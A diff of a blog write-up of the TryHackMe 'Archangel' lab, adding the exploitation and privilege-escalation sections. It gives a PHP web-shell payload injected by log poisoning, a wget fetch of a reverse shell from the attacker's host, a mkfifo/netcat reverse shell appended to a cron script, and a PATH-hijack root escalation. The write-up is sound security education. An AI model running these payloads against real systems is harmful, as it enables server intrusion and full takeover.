@@ -1,6 +1,6 @@
 ---
 title: TryHackMe | Archangel Writeup 
-date: 2026-04-29 
+date: 2026-05-02 
 categories: [TryHackMe]
 tags: ["local file inclusion", poison, "cron jobs", suid, "path hijacking"]     # TAG names should always be lowercase
 image:
@@ -129,7 +129,7 @@ view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.lo
 ![access log](assets/img/archangel/7-access_log.png)
 Since `User-Agent` is logged and it is easily modifiable in `HTTP GET` request, I had everything I needed to get access to the server.
 ## 5. Exploitation
-I used `Burp Suite` to intercept and modify `User-Agent` header with the following sciript:
+I used Burp Suite to intercept the request and modify `User-Agent` header with the following sciript:
 ```php
 <?php system($_GET['cmd']); ?>
 ```
@@ -141,11 +141,92 @@ Time to get a reverse shell. I started a Python web server using the following c
 ```bash
 python3 -m http.server 80
 ```
-
+If you are on Kali, the shell that I used is located at `/usr/share/webshells/php/php-reverse-shell.php`. Don't forget to set your IP and port (I picked `8888`) at the beginning of the file. I also set up a netcat listener via:
+```bash
+nc -lvnp 8888
+``` 
+One of possible ways to upload the reverse shell to the server is by using `wget`. The url would be looking as follows:
 ```
 http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=wget+http://<Your IP>/shell.php+-O+/tmp/shell.php
 ```
 
-Well, normally, `www-data` user that is being used in Apache servers to retrieve data does not have any write permissions in the web server directory. That's why I use globally-writable `/tmp` folder to store the reverse shell.
+Well, normally, `www-data` user that is being used in Apache servers to retrieve data does not have any write permissions in the web server directory. That's why I placed the reverse shell in globally-writable `/tmp` folder.
+The only thing left was to execute the reverse shell script by passing `cmd=php+/tmp/shell.php`.
+```
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=php+/tmp/shell.php
+```
+![got the reverse shell](assets/img/archangel/10-userflagaftershell.png)
 
+## 6. Privilege Escalation
+First, I ran `sudo -l` to see what `sudo` commands were allowed for `www-data` user but I got promted for a password which I did not have. Next thing I checked system-wide cron jobs. Cron jobs are commands that are set to be executed periodically (e.g., weekly, monthly). There was a cron job assigned to user `archangel` to execute `/opt/helloworld.sh`.
+```bash
+cat /etc/crontab
+```
+![cron jobs](assets/img/archangel/11-crontab.png)
 
+Luckily, `www-user` has write permissions on `/opt/helloworld.sh` so If I put a reverse shell script in that file, I will have access to the `archangel`'s shell. Before that, I started a second netcat listener on port `7777`:
+```bash
+nc -lvnp 7777
+``` 
+Paste the following command at the end of `/opt/helloworld.sh`. Don't forget to set your IP address.
+```bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <Your IP> 7777 > /tmp/f
+```
+I waited a bit and got the second user flag:
+![user flag 2](assets/img/archangel/12-user2flag.png)
+
+One of the things it's a good habit to check is `SUID` (Set User ID) executables. These are special files that, when run, are executed with the permissions of the file owner rather than the user who executed them. Since the goal is to get the `root` shell, I specifically looked for those owned by `root`. I ran the following command to search for binaries with the `SUID` bit set:
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+> `find /` starts search from the root directory \\
+`-perm` tells to use filtering based on permissions \\
+`-u=s` looks for the `SUID` bit set \\
+`-type f` looks only for files \\
+`2>/dev/null` ignore "Permission denied" errors
+
+In the output that I provide below I was looking for files that are not standard linux executables. Usually, these custom binaries are stored outside the system standard paths such as `/usr/bin`, `/usr/sbin`, `/bin`, `/sbin`, `/usr/lib` and `/lib` (including variants like `/lib64`).
+```
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/umount
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ping
+/home/archangel/secret/backup
+```
+The one that just screams "LOOK AT ME" is `/home/archangel/secret/backup`. After manually confirming it's owned by `root`, I began my inspection with `strace`.
+>From [GeeksForGeeks - Strace command in Linux with Examples](https://www.geeksforgeeks.org/linux-unix/strace-command-in-linux-with-examples/) - strace is a diagnostic, debugging and instructional userspace utility for Linux. It is used to monitor and tamper with interactions between processes and the Linux kernel, which include system calls, signal deliveries, and changes of process state.
+
+To put it simply, `strace` allowed me to observe exactly how `/home/archangel/secret/backup` interacts with the filesystem, executes commands, and handles errors in real time.
+``` bash
+strace /home/archangel/secret/backup 2>&1 | grep -iE "open|access|no such file"
+``` 
+> `2>&1` redirect to `stdout` instead of default `stderr` \\
+`grep -iE` case insensitive and enable Extended Regex that allows for "OR" ("|")  
+
+```
+wait4(1153, cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
+```
+The line above is the very last line of the output. It indicates that `/home/archangel/secret/backup` tried to copy a non-existing file. The most important thing and the one that enables the last step of privilage escalation is the fact that the command used `cp`, and not its absolote path variant. This means that the system will look into directories defined in `PATH` variable starting from the beginning to locate the executable named `cp`. On a side note, `strings` and  `ltrace` would also reveal the above-described vulnerability.
+
+To exploit this, I created a fake `cp` executable in `/tmp` and put `/tmp` as the first directory in system `PATH`:
+```bash
+export PATH=/tmp:$PATH           
+echo "/bin/bash -p" > /tmp/cp
+chmod +x /tmp/cp
+/home/archangel/secret/backup
+```
+> `/bin/bash -p` preserve privileges after opening a shell of the executing user
+
+Since `/home/archangel/secret/backup` executes with `root` privileges, `root` shell opened.
+![root flag](assets/img/archangel/13-rootflag.png).
